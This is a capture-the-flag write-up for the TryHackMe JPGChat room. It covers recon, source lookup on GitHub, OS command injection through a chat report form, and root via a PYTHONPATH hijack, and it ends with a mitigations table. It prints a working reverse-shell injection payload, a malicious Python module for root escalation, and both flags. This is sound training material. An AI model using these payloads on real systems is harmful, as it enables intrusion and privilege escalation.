# CTF Write-Up: [JPGChat](https://tryhackme.com/room/jpgchat)

> **Platform:** TryHackMe | **Difficulty:** Easy

---

## 🚩 Flags

<details>
<summary>User Flag</summary>

`JPC{487030410a543503cbb59ece16178318}`

</details>

<details>
<summary>Root Flag</summary>

`JPC{665b7f2e59cf44763e5a7f070b081b0a}`

</details>

---

## 1. Reconnaissance

### Initial Nmap Scan

```bash
nmap -vv -oN Nmap/Initial <IP_ADDRESS>
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
```

### Detailed Nmap Scan

```bash
nmap -vv -oN Nmap/Detailed -p 22,3000 -A <IP_ADDRESS>
```

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22 | SSH | OpenSSH 7.2p2 | Ubuntu 4ubuntu2.10 |
| 3000 | Custom | JPChat | ⚠️ Custom chat service — banner leaks GitHub reference |

The Nmap banner fingerprint for port 3000 immediately revealed the application name and a critical hint:

```
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
```

The service advertised that its source code was publicly available on the admin's GitHub. Interacting with the `[REPORT]` command revealed the admin's username. The service disconnected immediately after each input when typed interactively, so `printf` was piped into `nc` to send all lines at once before the connection dropped:

```bash
printf '[REPORT]\ntest\n' | nc <IP_ADDRESS> 3000
```

```
this report will be read by Mozzie-jpg
your name:
your report:
```

The admin username **Mozzie-jpg** was now known — enough to search GitHub directly.

---

## 2. OSINT — Source Code Discovery

The admin username `Mozzie-jpg` was searched on GitHub:

```
"Mozzie-jpg" site:github.com
```

The repository was found at:
🔗 [GitHub/Mozzie-jpg](https://github.com/Mozzie-jpg/JPChat)

The source file `jpchat.py` was reviewed in full. The critical section was the `report_form()` function:

```python
def report_form():
    print ('this report will be read by Mozzie-jpg')
    your_name = input('your name:\n')
    report_text = input('your report:\n')
    os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
    os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)
```

Both `your_name` and `your_report` were passed directly into `os.system()` via Python string formatting (`%s`) with no sanitisation — a textbook **OS command injection** vulnerability.

---

## 3. Initial Access — OS Command Injection

The `[REPORT]` command triggered `report_form()`, which prompted for a name and report text. The `your_name` input was embedded into a shell command as:

```bash
bash -c 'echo <INPUT> > /opt/jpchat/logs/report.txt'
```

Injecting a semicolon terminated the `echo` command and appended an arbitrary shell command. The `#` at the end commented out the closing single quote, preventing a syntax error.

A listener was started on the attacking machine:

```bash
nc -lvnp 4444
```

The payload was sent using `printf` to automate the multi-line interaction:

```bash
printf '[REPORT]\n;bash -i >& /dev/tcp/<tun0>/4444 0>&1 #\ntest\n' | nc <IP_ADDRESS> 3000
```

The `your_name` field received:
```
;bash -i >& /dev/tcp/<tun0>/4444 0>&1 #
```

A reverse shell was received as `wes`.

### Shell Stabilisation

The raw netcat shell lacked job control and interactive features — signals like `Ctrl+C` would kill the connection rather than the running process, tab completion was absent, and tools like `sudo` that expect a proper TTY would behave unexpectedly. Stabilisation was performed in three steps:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

`pty.spawn` upgraded the shell to a pseudo-terminal. `stty raw -echo` passed keystrokes directly to the remote shell without local processing, and `fg` restored the connection with full TTY support.

✅ Shell as `wes`.

---

## 4. User Flag

```bash
wes@ubuntu-xenial:~$ cat ~/user.txt
JPC{487030410a543503cbb59ece16178318}
```

> 🚩 `JPC{487030410a543503cbb59ece16178318}`

---

## 5. Privilege Escalation — PYTHONPATH Hijack

Checking sudo privileges for `wes`:

```bash
sudo -l
```

```
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```

Two things stood out. First, `wes` could run a specific Python script as root without a password. Second — and critically — `env_keep+=PYTHONPATH` was set in the sudo defaults, meaning the `PYTHONPATH` environment variable would be **preserved** when running the sudo command.

The target script was inspected:

```bash
cat /opt/development/test_module.py
```

```python
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))
```

The script imported the `compare` module using a wildcard import. Python resolves module imports by searching directories listed in `PYTHONPATH` before the standard library paths.

The attack was straightforward: create a malicious `compare.py` in a world-writable directory, then point `PYTHONPATH` at that directory when invoking the sudo command. Python would find and execute the malicious module instead of the legitimate one.

### Step 1: Create the Malicious Module

```bash
echo 'import os; os.system("/bin/bash")' > /tmp/compare.py
```

### Step 2: Execute with Hijacked PYTHONPATH

```bash
sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/development/test_module.py
```

Python imported `/tmp/compare.py` as root, which spawned a root shell.

```bash
root@ubuntu-xenial:~# whoami
root
```

✅ Root shell obtained.

---

## 6. Root Flag

```bash
root@ubuntu-xenial:~# cat /root/root.txt
JPC{665b7f2e59cf44763e5a7f070b081b0a}
```

> 🚩 `JPC{665b7f2e59cf44763e5a7f070b081b0a}`

---

## 7. Attack Chain

```
Nmap Scan
    └─► Port 3000 (JPChat) — banner leaks admin GitHub username: Mozzie-jpg

GitHub OSINT
    └─► https://github.com/Mozzie-jpg/JPChat → jpchat.py source code

Source code review
    └─► report_form() passes unsanitised input to os.system() via %s formatting

OS command injection via [REPORT] → your_name field
    └─► Reverse shell as wes

cat ~/user.txt → user flag

sudo -l → NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
         env_keep+=PYTHONPATH

test_module.py imports compare module
    └─► Malicious compare.py planted in /tmp
    └─► sudo PYTHONPATH=/tmp → Python imports /tmp/compare.py as root → root shell

cat /root/root.txt → root flag
```

---

## 8. Vulnerabilities & Mitigations

| # | Vulnerability | Impact | Mitigation |
|---|---------------|--------|------------|
| 1 | OS command injection via unsanitised `%s` string formatting in `os.system()` | Unauthenticated remote code execution as `wes` | Use `subprocess` with argument lists instead of shell string interpolation; sanitise all user input |
| 2 | `env_keep+=PYTHONPATH` in sudo defaults | Attacker can redirect Python module resolution to a malicious path | Remove `PYTHONPATH` from `env_keep`; avoid granting sudo to Python scripts that import third-party modules |
| 3 | Wildcard import (`from compare import *`) in root-executed script | Any file named `compare.py` on `PYTHONPATH` is executed as root | Use explicit imports; pin module paths; avoid wildcard imports in privileged scripts |

---

*JPGChat — TryHackMe | Rooted ✅*
